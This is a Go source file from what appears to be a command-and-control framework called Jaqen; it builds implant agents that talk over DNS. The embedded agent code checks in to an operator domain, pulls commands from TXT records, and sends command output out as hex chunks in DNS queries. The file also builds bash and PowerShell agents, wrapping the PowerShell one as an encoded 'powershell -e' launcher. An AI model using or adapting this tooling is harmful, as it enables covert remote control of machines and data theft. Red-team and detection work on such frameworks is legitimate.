package dnsListener

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"os"
	"path"
	"strconv"
	"text/template"

	"github.com/c-sto/Jaqen/libJaqen/server"
	"github.com/gobuffalo/packr"
	"golang.org/x/text/encoding/unicode"
)

func (d JaqenDNSListener) genGolangAgent() []byte {
	//Thanks to moloch-- and the rosie project for figuring out how to do the generation stuff mostly good https://github.com/moloch--/rosie
	dom, _ := d.GetOption("domain")

	codeStruct := server.AgentCode{

		Imports: `*/	
		"encoding/hex"
		"os"
		"fmt"
		"net"
		/*`,
		GlobalVars: `
		*/const payloadSizeMax = 62
/*
`,
		Checkin: `*/	
		net.LookupIP(a.uid + "." + a.settings.Get("c2Domain"))
		/*`,
		Init: `*/	
		a.settings.Set("c2Domain", "` + dom + `")
		/*`,
		GetCommand: `*/
		cmdID := RandStringRunes(4)
		lookupAddr := fmt.Sprintf("%s.%s.%s", cmdID, a.uid, a.settings.Get("c2Domain"))
		command, err := net.LookupTXT(lookupAddr)
		if err != nil {
			panic(err)
		}
	
		a.cmd, a.cmdID = command[0], cmdID
	
		if a.cmd != "NoCMD" {
			return true
		}
		if a.cmd == "exit"{
			os.Exit(0)
		}
		/*`,
		ExecCommand: `*//*`,
		SendResponse: `*/	
		encodedResult := hex.EncodeToString(b)
		blocks := len(encodedResult) / payloadSizeMax
		leftover := len(encodedResult) % payloadSizeMax
		if leftover > 0 {
			blocks++
		}
	
		for x := 1; x <= blocks; x++ {
			minVal := (x - 1) * payloadSizeMax
			maxVal := x * payloadSizeMax
			if maxVal > len(encodedResult) {
				maxVal = len(encodedResult)
			}
			payload := encodedResult[minVal:maxVal]
			chunknumber := x
			maxChunks := blocks
			lookupaddr := fmt.Sprintf("%s.%d.%d.%s.%s.%s", payload, chunknumber, maxChunks, a.cmdID, a.uid, a.GetSetting("c2Domain"))
	
			go func() {
				for {
					x, err := net.LookupIP(lookupaddr)
					if err != nil {
						continue
					}
					z := net.ParseIP("127.0.0.1")
					if z.Equal(x[0]) {
						break
					}
					time.Sleep(3) //arbitrary sleep retry value (1 was too low, got repeated responses)
				}
			}()
	
		}
		/*`,
	}

	codeStruct.AVoid("")

	boxs, err := packr.NewBox("../../../").MustString("agent/agent.go")
	if err != nil {
		fmt.Println(err)
		return []byte("")
	}

	code, err := template.New("goagent").Parse(boxs)
	if err != nil {
		fmt.Println(err)
		return []byte("")
	}

	var buf bytes.Buffer

	err = code.Execute(&buf, codeStruct)

	if err != nil {
		fmt.Println(err)
	}

	binDir, err := ioutil.TempDir("", "jaqen-build")

	if err != nil {
		fmt.Println(err)
	}

	workingDir := path.Join(binDir, "agent.go")

	fmt.Println("working", workingDir)
	codeFile, err := os.Create(workingDir)
	if err != nil {
		fmt.Println(err)
	}

	fmt.Println("Generating code to: " + codeFile.Name())

	err = code.Execute(codeFile, codeStruct)

	if err != nil {
		fmt.Println(err)
	}

	cgo, err := d.GetOption("cgo")
	if err != nil {
		cgo = "0"
	}
	goos, err := d.GetOption("goos")
	if err != nil {
		goos = "windows"
	}
	goarch, err := d.GetOption("goarch")
	if err != nil {
		goos = "x64"
	}

	outfile, _ := d.GetOption("outfile")

	buildr := []string{"build"}
	if outfile != "" {
		buildr = append(buildr, "-o")
		buildr = append(buildr, outfile)
	}

	goroot := server.GetGoRoot()
	gopath := server.GetGoPath()

	err = server.GoCmd(server.GoConfig{
		CGO:    cgo,
		GOOS:   goos,
		GOARCH: goarch,
		GOROOT: goroot,
		GOPATH: gopath,
	},
		binDir,
		buildr,
	)

	if err != nil {
		fmt.Println(err)
		return []byte{}
	}

	return []byte{} //buf.Bytes()
}

type powershellagent struct {
	Domain string
	Split  int
}

func (d JaqenDNSListener) genBashAgent() string {
	dom, _ := d.GetOption("domain")

	spl := 60

	st, e := d.GetOption("split")
	if e == nil {
		spl, e = strconv.Atoi(st)
		if e != nil {
			fmt.Println(e)
		}
	}

	cfg := powershellagent{
		Domain: dom,
		Split:  spl,
	}
	boxs, err := packr.NewBox("./").MustString("bashdnsagent.sh")

	if err != nil {
		fmt.Println(err)
		return ""
	}
	code, err := template.New("bashdnsagent").Parse(boxs)
	if err != nil {
		fmt.Println(err)
		return ""
	}
	var buf bytes.Buffer

	err = code.Execute(&buf, cfg)
	if err != nil {
		fmt.Println(err)
	}
	return buf.String()
}

func (d JaqenDNSListener) genPowershellAgent() string {
	dom, _ := d.GetOption("domain")

	spl := 60

	st, e := d.GetOption("split")
	if e == nil {
		spl, e = strconv.Atoi(st)
		if e != nil {
			fmt.Println(e)
		}
	}

	cfg := powershellagent{
		Domain: dom,
		Split:  spl,
	}
	boxs, err := packr.NewBox("./").MustString("dnsagent.ps1")

	if err != nil {
		fmt.Println(err)
		return ""
	}
	code, err := template.New("dnsagent").Parse(boxs)
	if err != nil {
		fmt.Println(err)
		return ""
	}
	var buf bytes.Buffer

	err = code.Execute(&buf, cfg)
	if err != nil {
		fmt.Println(err)
	}
	x, _ := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM).NewEncoder().String(buf.String())
	return "powershell -e " + base64.StdEncoding.EncodeToString([]byte(x))
	//return x //buf.String()
}
